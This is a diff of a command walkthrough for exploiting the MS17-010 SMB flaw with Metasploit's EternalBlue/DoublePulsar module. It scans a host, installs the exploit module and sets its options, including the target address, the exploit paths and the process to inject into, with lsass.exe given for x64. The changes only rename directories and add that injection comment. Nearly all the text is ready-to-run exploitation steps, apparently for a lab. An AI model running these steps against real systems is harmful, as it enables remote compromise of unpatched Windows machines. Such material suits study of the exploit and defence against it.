@@ -25,7 +25,7 @@ msf auxiliary(smb_ms17_010) > options
 msf auxiliary(smb_ms17_010) > set RHOSTS 192.168.1.107
 msf auxiliary(smb_ms17_010) > run
 
-# cd Eternalblue-Doublepulsar-Metasploit-master/
+# cd Eternalblue-Doublepulsar-Metasploit/
 # cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
 # cd deps
 # pwd
@@ -34,9 +34,9 @@ msf auxiliary(smb_ms17_010) > run
 > reload_all
 msf exploit(eternalblue_doublepulsar) > use exploit/windows/smb/eternalblue_doublepulsar
 msf exploit(eternalblue_doublepulsar) > options
-msf exploit(eternalblue_doublepulsar) > set DOUBLEPULSARPATH /root/Eternalblue-Doublepulsar-Metasploit-master/deps
-msf exploit(eternalblue_doublepulsar) > set ETERNALBLUEPATH /root/Eternalblue-Doublepulsar-Metasploit-master/deps
-msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT explorer.exe
+msf exploit(eternalblue_doublepulsar) > set DOUBLEPULSARPATH /root/Eternalblue-Doublepulsar-Metasploit/deps
+msf exploit(eternalblue_doublepulsar) > set ETERNALBLUEPATH /root/Eternalblue-Doublepulsar-Metasploit/deps
+msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT explorer.exe  # (Change to lsass.exe for x64)
 msf exploit(eternalblue_doublepulsar) > set RHOST 192.168.1.107
 msf exploit(eternalblue_doublepulsar) > set TARGETARCHITECTURE x64
 msf exploit(eternalblue_doublepulsar) > show targets
